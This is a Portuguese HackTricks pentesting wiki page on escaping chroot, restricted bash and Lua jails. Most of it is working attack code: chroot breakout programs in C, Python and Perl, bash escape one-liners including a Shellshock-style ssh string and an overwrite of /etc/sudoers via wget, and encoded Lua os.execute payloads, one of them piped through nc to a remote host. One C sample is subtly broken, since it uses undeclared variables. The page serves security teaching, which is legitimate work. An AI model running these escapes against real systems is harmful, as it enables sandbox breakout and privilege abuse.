# Escapando de Jaulas

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Treinamento HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Treinamento HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoie o HackTricks</summary>

* Verifique os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os repositórios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

## **GTFOBins**

**Pesquise em** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **se você pode executar algum binário com a propriedade "Shell"**

## Escapes de Chroot

De [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): O mecanismo chroot **não é destinado a defender** contra manipulação intencional por **usuários privilegiados** (**root**). Na maioria dos sistemas, os contextos chroot não empilham corretamente e programas chrooted **com privilégios suficientes podem realizar um segundo chroot para escapar**.\
Normalmente isso significa que para escapar você precisa ser root dentro do chroot.

{% hint style="success" %}
A **ferramenta** [**chw00t**](https://github.com/earthquake/chw00t) foi criada para abusar dos seguintes cenários e escapar do `chroot`.
{% endhint %}

### Root + CWD

{% hint style="warning" %}
Se você é **root** dentro de um chroot, **pode escapar** criando **outro chroot**. Isso ocorre porque 2 chroots não podem coexistir (no Linux), então se você criar uma pasta e depois **criar um novo chroot** nessa nova pasta estando **fora dele**, você estará **fora do novo chroot** e, portanto, estará no FS.

Isso ocorre porque geralmente o chroot NÃO move seu diretório de trabalho para o indicado, então você pode criar um chroot, mas estar fora dele.
{% endhint %}

Normalmente você não encontrará o binário `chroot` dentro de uma prisão chroot, mas você **poderia compilar, fazer upload e executar** um binário:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Descritor de Arquivo Salvo

{% hint style="warning" %}
Isso é semelhante ao caso anterior, mas neste caso o **atacante armazena um descritor de arquivo para o diretório atual** e então **cria o chroot em uma nova pasta**. Finalmente, como ele tem **acesso** a esse **FD** **fora** do chroot, ele o acessa e ele **escapa**.
{% endhint %}

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

{% hint style="warning" %}
FD pode ser passado por Unix Domain Sockets, então:

* Criar um processo filho (fork)
* Criar UDS para que o pai e o filho possam se comunicar
* Executar chroot no processo filho em uma pasta diferente
* No processo pai, criar um FD de uma pasta que está fora do novo chroot do processo filho
* Passar para o processo filho esse FD usando o UDS
* Processo filho muda o diretório para esse FD e, como está fora de seu chroot, ele irá escapar da prisão
{% endhint %}

### Root + Mount

{% hint style="warning" %}
* Montar o dispositivo raiz (/) em um diretório dentro do chroot
* Executar chroot nesse diretório

Isso é possível no Linux
{% endhint %}

### Root + /proc

{% hint style="warning" %}
* Montar procfs em um diretório dentro do chroot (se ainda não estiver montado)
* Procurar por um pid que tenha uma entrada de root/cwd diferente, como: /proc/1/root
* Executar chroot nessa entrada
{% endhint %}

### Root(?) + Fork

{% hint style="warning" %}
* Criar um Fork (processo filho) e chroot em uma pasta diferente mais profunda no sistema de arquivos e mudar para ela
* A partir do processo pai, mover a pasta onde o processo filho está para uma pasta anterior ao chroot dos filhos
* Esse processo filho se encontrará fora do chroot
{% endhint %}

### ptrace

{% hint style="warning" %}
* Há algum tempo, os usuários podiam depurar seus próprios processos a partir de um processo próprio... mas isso não é mais possível por padrão
* De qualquer forma, se for possível, você poderia ptrace em um processo e executar um shellcode dentro dele ([veja este exemplo](linux-capabilities.md#cap\_sys\_ptrace)).
{% endhint %}

## Bash Jails

### Enumeração

Obter informações sobre a prisão:
```bash
echo $SHELL
echo $PATH
env
export
pwd
```
### Modificar o PATH

Verifique se você pode modificar a variável de ambiente PATH
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### Usando o vim
```bash
:set shell=/bin/sh
:shell
```
### Criar script

Verifique se você pode criar um arquivo executável com _/bin/bash_ como conteúdo
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### Obter bash a partir do SSH

Se estiver acessando via ssh, você pode usar este truque para executar um shell bash:
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
### Declarar
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

Você pode sobrescrever, por exemplo, o arquivo sudoers
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Outros truques

[**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)\
[https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
[https://gtfobins.github.io](https://gtfobins.github.io)\
**Também pode ser interessante a página:**

{% content-ref url="../bypass-bash-restrictions/" %}
[bypass-bash-restrictions](../bypass-bash-restrictions/)
{% endcontent-ref %}

## Jaulas Python

Truques sobre como escapar de jaulas Python na seguinte página:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

## Jaulas Lua

Nesta página, você pode encontrar as funções globais às quais você tem acesso dentro do Lua: [https://www.gammon.com.au/scripts/doc.php?general=lua\_base](https://www.gammon.com.au/scripts/doc.php?general=lua\_base)

**Avaliação com execução de comando:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Algumas dicas para **chamar funções de uma biblioteca sem usar pontos**:
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
Enumerar funções de uma biblioteca:
```bash
for k,v in pairs(string) do print(k,v) end
```
Note que toda vez que você executar o comando anterior em um **ambiente lua diferente a ordem das funções muda**. Portanto, se você precisar executar uma função específica, você pode realizar um ataque de força bruta carregando diferentes ambientes lua e chamando a primeira função da biblioteca le:
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Obter um shell lua interativo**: Se você estiver dentro de um shell lua limitado, você pode obter um novo shell lua (e esperançosamente ilimitado) chamando:
```bash
debug.debug()
```
## Referências

* [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Slides: [https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf))

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Treinamento AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Treinamento GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Suporte HackTricks</summary>

* Verifique os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os repositórios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
